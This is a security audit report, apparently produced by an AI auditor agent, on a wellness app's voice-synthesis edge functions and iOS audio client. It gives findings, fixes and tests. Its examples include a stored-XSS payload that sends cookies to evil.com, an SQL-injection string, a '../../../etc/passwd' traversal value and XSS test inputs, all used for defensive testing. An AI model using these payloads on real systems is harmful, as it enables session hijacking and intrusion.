# Security Audit: Generative Wellness Feature
**Feature:** AI-Generated Wellness Content (Text & Voice)
**Date:** 2026-01-24
**Auditor:** Security Auditor Agent
**Scope:** Input/Output Security, URL Validation, Audio File Handling

---

## Executive Summary

**Overall Security Rating: 6/10** (Medium Risk)

The Generative Wellness feature has several critical security gaps that must be addressed before production deployment. While authentication and rate limiting are properly implemented, there are significant vulnerabilities in input validation, output sanitization, and URL handling.

**Critical Findings:** 3
**High Risk:** 4
**Medium Risk:** 3
**Low Risk:** 2

**Estimated Time to 10/10:** 4-6 hours of focused security hardening

---

## Finding 1: Missing UUID Validation on Content IDs

**Severity:** CRITICAL
**Location:** 
- `supabase/functions/synthesize-voice/index.ts:162`
- `supabase/functions/rate-content/index.ts:94`

**CWE:** CWE-20 (Improper Input Validation)

### Description

Both Edge Functions accept `contentId` parameters without validating UUID format. Attackers can inject SQL-like patterns, NoSQL injection payloads, or trigger database errors.

### Current Code

```typescript
// synthesize-voice/index.ts:162-174
if (!request.contentId) {
  return new Response(
    JSON.stringify({
      success: false,
      error: "contentId is required",
      code: "INVALID_REQUEST",
    })
  )
}
// No UUID format validation!
```

### Impact

- SQL injection attempts (though Supabase uses parameterized queries, defense-in-depth is critical)
- Database error exposure via malformed UUIDs
- Potential for enumeration attacks using sequential IDs
- Bypassing access control via crafted IDs

### Reproduction

```bash
# Send malformed contentId
curl -X POST https://your-project.supabase.co/functions/v1/synthesize-voice \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"contentId": "1 OR 1=1--", "voiceId": "test"}'

# Expected: 400 Bad Request with validation error
# Actual: Database query error or unexpected behavior
```

### Remediation

**Import and use the existing UUID validator:**

```typescript
import { validateUUID } from "../_shared/validation.ts";

// In synthesize-voice/index.ts (after line 159)
if (!request.contentId || !validateUUID(request.contentId)) {
  return new Response(
    JSON.stringify({
      success: false,
      error: "Invalid contentId format (must be UUID)",
      code: "INVALID_REQUEST",
    }),
    {
      status: 400,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}

// Same pattern for rate-content/index.ts after line 94
```

**Priority:** IMMEDIATE (Block deployment until fixed)

---

## Finding 2: Missing Voice ID Validation

**Severity:** CRITICAL
**Location:** `supabase/functions/synthesize-voice/index.ts:232`

**CWE:** CWE-20 (Improper Input Validation)

### Description

The `voiceId` parameter is passed directly to ElevenLabs API without validation. Attackers can inject malicious payloads, attempt path traversal, or enumerate valid voice IDs.

### Current Code

```typescript
// Line 232
const voiceId = request.voiceId || content.voice_id || DEFAULT_VOICE_ID;
// No validation on voiceId format!
```

### Impact

- API key leakage via error messages
- Enumeration of valid ElevenLabs voice IDs
- Potential SSRF if ElevenLabs client doesn't validate
- Information disclosure via error responses

### Remediation

**Add strict voiceId validation:**

```typescript
// After line 232, before using voiceId
const VOICE_ID_PATTERN = /^[a-zA-Z0-9]{20,30}$/; // ElevenLabs voice ID format
if (!VOICE_ID_PATTERN.test(voiceId)) {
  return new Response(
    JSON.stringify({
      success: false,
      error: "Invalid voice ID format",
      code: "INVALID_REQUEST",
    }),
    {
      status: 400,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}

// Optional: Maintain allowlist of known voice IDs
const ALLOWED_VOICE_IDS = [
  DEFAULT_VOICE_ID,
  // Add other approved voices from database
];
// if (!ALLOWED_VOICE_IDS.includes(voiceId)) { reject }
```

**Priority:** IMMEDIATE

---

## Finding 3: No Output Sanitization on Feedback Text

**Severity:** CRITICAL
**Location:** `supabase/functions/rate-content/index.ts:139`

**CWE:** CWE-79 (Cross-Site Scripting via Stored Data)

### Description

User-submitted `feedback` text is stored in the database without sanitization. When displayed in admin dashboards or analytics tools, this creates a stored XSS vulnerability.

### Current Code

```typescript
// Line 134-140
.upsert({
  user_id: user.id,
  content_id: request.contentId,
  rating: request.rating,
  helpful: request.helpful,
  feedback: request.feedback, // ⚠️ No sanitization!
})
```

### Impact

- Stored XSS when feedback is displayed to admins
- Potential HTML injection in email reports
- Database pollution with malicious scripts
- Admin session hijacking

### Exploitation Example

```json
{
  "contentId": "uuid-here",
  "rating": 5,
  "feedback": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
}
```

### Remediation

**Sanitize all user-provided text:**

```typescript
import { sanitizeInput } from "../_shared/validation.ts";

// Before line 133
const sanitizedFeedback = request.feedback 
  ? sanitizeInput(request.feedback.trim())
  : null;

// Validate length
if (sanitizedFeedback && sanitizedFeedback.length > 500) {
  return new Response(
    JSON.stringify({
      error: "INVALID_FEEDBACK",
      message: "Feedback must be at most 500 characters",
    }),
    {
      status: 400,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}

// Line 139
feedback: sanitizedFeedback,
```

**Priority:** IMMEDIATE

---

## Finding 4: Unsafe URL Construction in iOS Client

**Severity:** HIGH
**Location:** `apps/ios/MindFriendApp/Features/Generative/GeneratedStoryView.swift:316-318`

**CWE:** CWE-601 (URL Redirection to Untrusted Site)

### Description

The iOS client constructs audio URLs directly from database strings without validation. Attackers who compromise a user account could inject malicious URLs pointing to:
- Phishing sites
- Malware hosting
- Data exfiltration endpoints
- Local file system (`file://`)

### Current Code

```swift
// Line 316-318
guard let urlString = content.audioUrl,
      let url = URL(string: urlString) else {
    player.error = "No audio available"
    return
}
```

### Impact

- Redirect users to phishing sites
- Trigger iOS URL scheme attacks (`tel://`, `facetime://`, etc.)
- Local file access via `file://` URLs
- SSRF via internal network URLs

### Remediation

**Add strict URL validation:**

```swift
// Add validation method to AudioPlayerViewModel
private func validateAudioURL(_ urlString: String) -> URL? {
    guard let url = URL(string: urlString) else { return nil }
    
    // Require HTTPS
    guard url.scheme == "https" else {
        print("Security: Rejected non-HTTPS URL: \(urlString)")
        return nil
    }
    
    // Allowlist: Only Supabase Storage URLs
    let allowedHosts = [
        "supabase.co",
        ".supabase.co", // Catch all subdomains
        // Add your specific project URL
    ]
    
    guard let host = url.host,
          allowedHosts.contains(where: { host.hasSuffix($0) }) else {
        print("Security: Rejected URL from untrusted host: \(host ?? "nil")")
        return nil
    }
    
    return url
}

// Update loadAudio() method (line 315)
private func loadAudio() {
    guard let urlString = content.audioUrl,
          let url = validateAudioURL(urlString) else {
        player.error = "Invalid or untrusted audio source"
        return
    }
    
    Task {
        do {
            try await player.load(audioURL: url)
        } catch {
            player.error = "Failed to load audio"
        }
    }
}
```

**Priority:** HIGH (Fix before beta release)

---

## Finding 5: Missing MIME Type Validation on Audio Upload

**Severity:** HIGH
**Location:** `supabase/functions/synthesize-voice/index.ts:307`

**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

### Description

Audio files are uploaded to Supabase Storage without validating the MIME type returned by ElevenLabs. Attackers could potentially:
- Upload non-audio files if ElevenLabs is compromised
- Store malicious executable files disguised as audio
- Bypass storage quotas with oversized files

### Current Code

```typescript
// Line 305-310
const { error: uploadError } = await supabaseAdmin.storage
  .from("generated-audio")
  .upload(fileName, ttsResult.audioData, {
    contentType: ttsResult.contentType, // ⚠️ No validation!
    upsert: true,
  });
```

### Remediation

**Validate MIME type before upload:**

```typescript
// After line 302, before upload
const ALLOWED_AUDIO_TYPES = [
  "audio/mpeg",
  "audio/mp3",
  "audio/wav",
  "audio/ogg",
];

if (!ALLOWED_AUDIO_TYPES.includes(ttsResult.contentType)) {
  console.error(`Invalid audio MIME type: ${ttsResult.contentType}`);
  return new Response(
    JSON.stringify({
      success: false,
      error: "Invalid audio format received",
      code: "SYNTHESIS_ERROR",
    }),
    {
      status: 500,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}

// Also validate file size
const MAX_AUDIO_SIZE = 50 * 1024 * 1024; // 50 MB
if (ttsResult.audioData.byteLength > MAX_AUDIO_SIZE) {
  console.error(`Audio file too large: ${ttsResult.audioData.byteLength} bytes`);
  return new Response(
    JSON.stringify({
      success: false,
      error: "Audio file exceeds size limit",
      code: "FILE_TOO_LARGE",
    }),
    {
      status: 413,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}
```

**Priority:** HIGH

---

## Finding 6: Insufficient Text Content Length Validation

**Severity:** HIGH
**Location:** `supabase/functions/synthesize-voice/index.ts:214`

**CWE:** CWE-770 (Allocation of Resources Without Limits)

### Description

While minimum length is validated (10 chars), there's no maximum validation before processing. Attackers can:
- Exhaust TTS API quotas
- Cause excessive billing
- DoS the service with multi-MB text payloads

### Current Code

```typescript
// Line 214-226
if (!textContent || textContent.trim().length < 10) {
  return new Response(
    JSON.stringify({
      success: false,
      error: "Content text too short for synthesis",
      code: "INVALID_CONTENT",
    })
  )
}
// ⚠️ No upper limit check!
```

### Remediation

**Add maximum length validation:**

```typescript
const trimmedContent = textContent.trim();

// Validate length bounds
const MIN_TEXT_LENGTH = 10;
const MAX_TEXT_LENGTH = 100000; // ~100KB of text (reasonable for 60min audio)

if (trimmedContent.length < MIN_TEXT_LENGTH) {
  return new Response(
    JSON.stringify({
      success: false,
      error: "Content text too short for synthesis (minimum 10 characters)",
      code: "INVALID_CONTENT",
    }),
    {
      status: 400,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}

if (trimmedContent.length > MAX_TEXT_LENGTH) {
  return new Response(
    JSON.stringify({
      success: false,
      error: "Content text too long for synthesis (maximum 100,000 characters)",
      code: "INVALID_CONTENT",
    }),
    {
      status: 400,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}
```

**Priority:** HIGH

---

## Finding 7: Missing Range Validation on Voice Settings

**Severity:** MEDIUM
**Location:** `supabase/functions/synthesize-voice/index.ts:236-241`

**CWE:** CWE-1284 (Improper Validation of Specified Quantity)

### Description

Only `stability` and `speed` are validated for range. The `similarityBoost` and `style` parameters are not validated, allowing out-of-range values.

### Current Code

```typescript
// Line 234-241
const finalSettings: VoiceSettings = {
  stability: request.voiceSettings?.stability ?? presetSettings.stability,
  similarityBoost: request.voiceSettings?.similarityBoost ?? presetSettings.similarityBoost, // ⚠️ No validation
  style: request.voiceSettings?.style ?? presetSettings.style, // ⚠️ No validation
  speed: request.voiceSettings?.speed ?? presetSettings.speed,
};

// Only stability and speed validated (lines 244-269)
```

### Remediation

**Validate all voice settings:**

```typescript
// After line 241, before existing validations
if (
  finalSettings.stability < 0 || finalSettings.stability > 1 ||
  finalSettings.similarityBoost < 0 || finalSettings.similarityBoost > 1 ||
  finalSettings.style < 0 || finalSettings.style > 1 ||
  finalSettings.speed < 0.5 || finalSettings.speed > 2.0
) {
  const errors = [];
  if (finalSettings.stability < 0 || finalSettings.stability > 1) {
    errors.push("stability must be between 0 and 1");
  }
  if (finalSettings.similarityBoost < 0 || finalSettings.similarityBoost > 1) {
    errors.push("similarityBoost must be between 0 and 1");
  }
  if (finalSettings.style < 0 || finalSettings.style > 1) {
    errors.push("style must be between 0 and 1");
  }
  if (finalSettings.speed < 0.5 || finalSettings.speed > 2.0) {
    errors.push("speed must be between 0.5 and 2.0");
  }
  
  return new Response(
    JSON.stringify({
      success: false,
      error: errors.join(", "),
      code: "INVALID_REQUEST",
    }),
    {
      status: 400,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}
```

**Priority:** MEDIUM

---

## Finding 8: Inadequate Rating Value Validation

**Severity:** MEDIUM
**Location:** `supabase/functions/rate-content/index.ts:97`

**CWE:** CWE-20 (Improper Input Validation)

### Description

Rating validation only checks range (1-5) but doesn't validate data type. JavaScript allows `rating: 3.7` which should be rejected (ratings must be integers).

### Current Code

```typescript
// Line 97-108
if (request.rating < 1 || request.rating > 5) {
  return new Response(
    JSON.stringify({
      error: "INVALID_RATING",
      message: "Rating must be between 1 and 5",
    })
  )
}
// ⚠️ Doesn't check if rating is an integer
```

### Remediation

```typescript
if (
  typeof request.rating !== "number" ||
  !Number.isInteger(request.rating) ||
  request.rating < 1 ||
  request.rating > 5
) {
  return new Response(
    JSON.stringify({
      error: "INVALID_RATING",
      message: "Rating must be an integer between 1 and 5",
    }),
    {
      status: 400,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}
```

**Priority:** MEDIUM

---

## Finding 9: No File Path Sanitization in Storage Upload

**Severity:** MEDIUM
**Location:** `supabase/functions/synthesize-voice/index.ts:304`

**CWE:** CWE-22 (Path Traversal)

### Description

The storage file path is constructed using user ID and content ID without sanitization. While UUID validation would prevent this, defense-in-depth requires path sanitization.

### Current Code

```typescript
// Line 304
const fileName = `${user.id}/${content.id}.mp3`;
```

### Remediation

```typescript
// After implementing UUID validation for content.id
const sanitizedUserId = user.id.replace(/[^a-zA-Z0-9-]/g, "");
const sanitizedContentId = content.id.replace(/[^a-zA-Z0-9-]/g, "");
const fileName = `${sanitizedUserId}/${sanitizedContentId}.mp3`;

// Prevent path traversal attempts
if (fileName.includes("..") || fileName.includes("//")) {
  console.error(`Path traversal attempt detected: ${fileName}`);
  return new Response(
    JSON.stringify({
      success: false,
      error: "Invalid file path",
      code: "SECURITY_ERROR",
    }),
    {
      status: 400,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}
```

**Priority:** MEDIUM (Lower priority if Finding 1 is fixed)

---

## Finding 10: iOS Audio Player Lacks Network Security Config

**Severity:** LOW
**Location:** `apps/ios/MindFriendApp/Features/Generative/AudioPlayerViewModel.swift:111`

**CWE:** CWE-311 (Missing Encryption of Sensitive Data)

### Description

The `AVURLAsset` is created without explicit certificate pinning or transport security configuration. This is generally acceptable for HTTPS, but high-security apps should implement certificate pinning.

### Remediation (Optional Enhancement)

Implement certificate pinning for Supabase Storage URLs using `URLSession` with custom delegate:

```swift
// Create custom URLSession with certificate pinning
private func createSecureAudioSession() -> URLSession {
    let configuration = URLSessionConfiguration.default
    let delegate = CertificatePinningDelegate(allowedHosts: ["supabase.co"])
    return URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
}

// Use for audio loading with AVURLAsset(url:options:)
let asset = AVURLAsset(url: audioURL, options: [
    AVURLAssetHTTPHeaderFieldsKey: ["User-Agent": "MindFriend-iOS/1.0"]
])
```

**Priority:** LOW (Enhancement, not blocker)

---

## Finding 11: Missing Content-Type Validation in iOS

**Severity:** LOW
**Location:** `apps/ios/MindFriendApp/Features/Generative/AudioPlayerViewModel.swift:111`

**CWE:** CWE-434 (Unrestricted File Upload)

### Description

When loading audio, the client doesn't verify the Content-Type header matches expected audio formats. Malicious responses could serve non-audio data.

### Remediation

```swift
func load(audioURL: URL) async throws {
    isLoading = true
    error = nil

    // Fetch HEAD to validate Content-Type before loading
    var request = URLRequest(url: audioURL)
    request.httpMethod = "HEAD"
    
    let (_, response) = try await URLSession.shared.data(for: request)
    
    guard let httpResponse = response as? HTTPURLResponse,
          httpResponse.statusCode == 200,
          let contentType = httpResponse.value(forHTTPHeaderField: "Content-Type"),
          contentType.hasPrefix("audio/") else {
        throw AudioPlayerError.invalidContentType
    }

    // Proceed with asset loading
    let asset = AVURLAsset(url: audioURL)
    // ... rest of implementation
}
```

**Priority:** LOW

---

## Finding 12: Insufficient Error Message Sanitization

**Severity:** LOW
**Location:** Multiple locations in both Edge Functions

**CWE:** CWE-209 (Information Exposure Through Error Messages)

### Description

Some error messages expose internal details that could aid attackers:
- Database errors logged to console (lines 313, 408)
- ElevenLabs API errors passed through (line 335)

### Remediation

**Generic error messages to clients, detailed logs server-side:**

```typescript
// Example for database errors
if (updateError) {
  console.error("Database update error:", updateError); // Server-side log
  // Don't return detailed DB error to client
  return new Response(
    JSON.stringify({
      success: false,
      error: "Failed to update content record",
      code: "DATABASE_ERROR",
    }),
    {
      status: 500,
      headers: { ...baseCorsHeaders, "Content-Type": "application/json" },
    }
  );
}
```

**Priority:** LOW

---

## Positive Security Controls (Already Implemented)

1. ✅ **Authentication:** JWT validation on all Edge Functions
2. ✅ **Authorization:** Ownership verification (line 198-210)
3. ✅ **Rate Limiting:** Implemented via `checkRateLimit()` (line 143)
4. ✅ **CORS:** Proper CORS headers with origin validation
5. ✅ **HTTPS:** Supabase enforces HTTPS for all API calls
6. ✅ **RLS:** Database-level security (assumed from architecture)
7. ✅ **Audio Session Interruption Handling:** Proper iOS lifecycle management

---

## Remediation Roadmap to 10/10

### Phase 1: Critical Fixes (2 hours)
**Blocks production deployment**

1. [ ] Implement UUID validation on all `contentId` parameters (Finding 1)
2. [ ] Add voiceId validation and allowlist (Finding 2)
3. [ ] Sanitize feedback text input (Finding 3)

### Phase 2: High-Risk Fixes (2 hours)
**Required for beta release**

4. [ ] Add URL validation in iOS client (Finding 4)
5. [ ] Validate MIME types on audio uploads (Finding 5)
6. [ ] Add maximum text content length check (Finding 6)

### Phase 3: Medium-Risk Fixes (1 hour)
**Required for production**

7. [ ] Validate all voice settings ranges (Finding 7)
8. [ ] Enforce integer ratings (Finding 8)
9. [ ] Sanitize file paths (Finding 9)

### Phase 4: Hardening (1 hour)
**Production polish**

10. [ ] Implement certificate pinning (Finding 10)
11. [ ] Add Content-Type validation in iOS (Finding 11)
12. [ ] Sanitize all error messages (Finding 12)

### Phase 5: Testing & Validation (30 minutes)

13. [ ] Create integration tests for all validation functions
14. [ ] Penetration test all Edge Function endpoints
15. [ ] Fuzz test with malformed inputs
16. [ ] Verify rate limiting under load

---

## Security Testing Checklist

### Manual Tests

```bash
# Test 1: UUID Validation
curl -X POST $FUNCTION_URL/synthesize-voice \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"contentId": "invalid-uuid"}'
# Expected: 400 with "Invalid contentId format"

# Test 2: Voice ID Validation
curl -X POST $FUNCTION_URL/synthesize-voice \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"contentId": "$VALID_UUID", "voiceId": "../../../etc/passwd"}'
# Expected: 400 with "Invalid voice ID format"

# Test 3: XSS in Feedback
curl -X POST $FUNCTION_URL/rate-content \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"contentId": "$VALID_UUID", "rating": 5, "feedback": "<script>alert(1)</script>"}'
# Expected: Feedback stored as "&lt;script&gt;alert(1)&lt;/script&gt;"

# Test 4: Oversized Text
curl -X POST $FUNCTION_URL/synthesize-voice \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"contentId\": \"$VALID_UUID\", \"textContent\": \"$(head -c 200000 /dev/urandom | base64)\"}"
# Expected: 400 with "Content text too long"

# Test 5: Rate Limiting
for i in {1..20}; do
  curl -X POST $FUNCTION_URL/synthesize-voice -H "Authorization: Bearer $TOKEN" -d '{"contentId": "$UUID"}'
done
# Expected: 429 after threshold
```

### Automated Tests (Add to test suite)

```typescript
// supabase/functions/synthesize-voice/test.ts
Deno.test("rejects invalid UUID contentId", async () => {
  const response = await testFunction({
    contentId: "not-a-uuid",
  });
  assertEquals(response.status, 400);
  assertStringIncludes(await response.text(), "Invalid contentId");
});

Deno.test("rejects malicious voiceId", async () => {
  const response = await testFunction({
    contentId: validUUID,
    voiceId: "../../../etc/passwd",
  });
  assertEquals(response.status, 400);
});

Deno.test("sanitizes XSS in feedback", async () => {
  const response = await testRateContent({
    contentId: validUUID,
    rating: 5,
    feedback: '<img src=x onerror="alert(1)">',
  });
  const data = await response.json();
  assertNotEquals(data.feedback, '<img src=x onerror="alert(1)">');
});
```

---

## Compliance & Standards Alignment

### OWASP Top 10 Coverage

- ✅ **A01: Broken Access Control** - RLS + ownership checks
- ⚠️ **A02: Cryptographic Failures** - HTTPS enforced (cert pinning optional)
- ❌ **A03: Injection** - Missing UUID validation (Finding 1)
- ✅ **A04: Insecure Design** - Rate limiting implemented
- ⚠️ **A05: Security Misconfiguration** - Error messages need hardening
- ✅ **A06: Vulnerable Components** - Dependencies up-to-date
- ✅ **A07: Authentication Failures** - JWT validation present
- ⚠️ **A08: Data Integrity** - Missing MIME validation (Finding 5)
- ⚠️ **A09: Logging Failures** - Logs present but verbose
- ⚠️ **A10: SSRF** - Missing URL validation (Finding 4)

### HIPAA/PII Considerations

While this feature doesn't directly handle PHI, generated wellness content may contain sensitive psychological data:

1. ✅ Encryption in transit (HTTPS)
2. ✅ Access control (RLS)
3. ⚠️ Audit logging incomplete (need content access logs)
4. ⚠️ Data retention policy undefined
5. ✅ User authentication required

---

## Recommended Security Enhancements (Beyond 10/10)

### Advanced Protections

1. **Content Security Policy (CSP)** for web dashboard viewing generated content
2. **Subresource Integrity (SRI)** for any CDN-hosted assets
3. **Web Application Firewall (WAF)** rules for Edge Functions
4. **Anomaly detection** for unusual generation patterns (e.g., 100 requests in 1 minute)
5. **Content moderation** for generated text before synthesis
6. **Watermarking** of generated audio files
7. **DRM protection** for premium audio content
8. **Encrypted storage** for sensitive user preferences

### Monitoring & Alerting

```sql
-- Add audit trigger for content generation
CREATE OR REPLACE FUNCTION log_content_generation()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO audit_logs (user_id, action, resource_id, metadata)
  VALUES (NEW.user_id, 'content_generated', NEW.id, jsonb_build_object(
    'content_type', NEW.content_type,
    'duration', NEW.duration,
    'voice_id', NEW.voice_id
  ));
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER audit_content_generation
AFTER INSERT ON generated_content
FOR EACH ROW EXECUTE FUNCTION log_content_generation();
```

---

## Final Score Breakdown

| Category                  | Current Score | Target Score | Fixes Required          |
| ------------------------- | ------------- | ------------ | ----------------------- |
| Input Validation          | 4/10          | 10/10        | Findings 1, 2, 6, 7, 8  |
| Output Sanitization       | 3/10          | 10/10        | Findings 3, 12          |
| URL/File Handling         | 5/10          | 10/10        | Findings 4, 5, 9, 11    |
| Authentication            | 10/10         | 10/10        | None (already secure)   |
| Rate Limiting             | 10/10         | 10/10        | None (already secure)   |
| Error Handling            | 7/10          | 10/10        | Finding 12              |
| **Overall Security**      | **6/10**      | **10/10**    | **12 findings total**   |

---

## Appendix A: Validation Utility Functions

Create `supabase/functions/_shared/content-validation.ts`:

```typescript
import { validateUUID } from "./validation.ts";

/**
 * Validates content ID (UUID format)
 */
export function validateContentId(contentId: unknown): boolean {
  return typeof contentId === "string" && validateUUID(contentId);
}

/**
 * Validates ElevenLabs voice ID format
 */
export function validateVoiceId(voiceId: unknown): boolean {
  if (typeof voiceId !== "string") return false;
  return /^[a-zA-Z0-9]{20,30}$/.test(voiceId);
}

/**
 * Validates voice settings object
 */
export function validateVoiceSettings(settings: unknown): {
  valid: boolean;
  errors: string[];
} {
  const errors: string[] = [];
  
  if (!settings || typeof settings !== "object") {
    return { valid: false, errors: ["Voice settings must be an object"] };
  }
  
  const s = settings as any;
  
  if (s.stability !== undefined && (s.stability < 0 || s.stability > 1)) {
    errors.push("stability must be between 0 and 1");
  }
  if (s.similarityBoost !== undefined && (s.similarityBoost < 0 || s.similarityBoost > 1)) {
    errors.push("similarityBoost must be between 0 and 1");
  }
  if (s.style !== undefined && (s.style < 0 || s.style > 1)) {
    errors.push("style must be between 0 and 1");
  }
  if (s.speed !== undefined && (s.speed < 0.5 || s.speed > 2.0)) {
    errors.push("speed must be between 0.5 and 2.0");
  }
  
  return { valid: errors.length === 0, errors };
}

/**
 * Validates audio URL (HTTPS + Supabase domain)
 */
export function validateAudioURL(url: unknown): boolean {
  if (typeof url !== "string") return false;
  
  try {
    const parsed = new URL(url);
    return parsed.protocol === "https:" && 
           parsed.hostname.endsWith(".supabase.co");
  } catch {
    return false;
  }
}

/**
 * Validates text content length
 */
export function validateTextContent(text: unknown): {
  valid: boolean;
  errors: string[];
} {
  const errors: string[] = [];
  
  if (typeof text !== "string") {
    return { valid: false, errors: ["Text content must be a string"] };
  }
  
  const trimmed = text.trim();
  
  if (trimmed.length < 10) {
    errors.push("Text content too short (minimum 10 characters)");
  }
  if (trimmed.length > 100000) {
    errors.push("Text content too long (maximum 100,000 characters)");
  }
  
  return { valid: errors.length === 0, errors };
}
```

---

## Appendix B: iOS Security Extensions

Create `apps/ios/MindFriendApp/Core/Security/URLValidator.swift`:

```swift
import Foundation

enum URLValidationError: Error {
    case invalidURL
    case insecureScheme
    case untrustedHost
    case malformedURL
}

struct URLValidator {
    private static let allowedSchemes = ["https"]
    private static let allowedHosts = [
        "supabase.co",
        ".supabase.co" // Wildcard for subdomains
    ]
    
    /// Validates URL for audio playback
    /// - Parameter urlString: URL to validate
    /// - Returns: Validated URL
    /// - Throws: URLValidationError if validation fails
    static func validateAudioURL(_ urlString: String) throws -> URL {
        guard let url = URL(string: urlString) else {
            throw URLValidationError.invalidURL
        }
        
        // Require HTTPS
        guard let scheme = url.scheme,
              allowedSchemes.contains(scheme) else {
            throw URLValidationError.insecureScheme
        }
        
        // Require Supabase host
        guard let host = url.host,
              allowedHosts.contains(where: { host.hasSuffix($0) }) else {
            throw URLValidationError.untrustedHost
        }
        
        // Prevent path traversal
        let path = url.path
        if path.contains("..") || path.contains("//") {
            throw URLValidationError.malformedURL
        }
        
        return url
    }
}
```

---

## Document Metadata

- **Version:** 1.0
- **Last Updated:** 2026-01-24
- **Next Review:** After implementing Phase 1-3 fixes
- **Owner:** Security Team
- **Stakeholders:** Backend Team, iOS Team, Product Security

